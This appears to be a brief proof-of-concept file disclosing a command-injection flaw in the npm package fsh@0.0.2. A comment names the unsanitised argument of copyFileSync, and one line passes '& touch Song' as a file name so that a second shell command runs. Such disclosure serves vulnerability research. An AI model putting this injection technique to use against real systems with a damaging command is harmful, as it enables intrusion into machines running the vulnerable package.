/**
 * fsh@0.0.2 is vulnerable to command injection.
 * the injection point is located in line 60 of index file "lib/fsh.js" in 
 * function copyFileSync(soucre, dest);
 * the argument "source" can be controlled by users without any sanitization.
 */

var root = require("fsh");
root.copyFileSync('& touch Song', '');

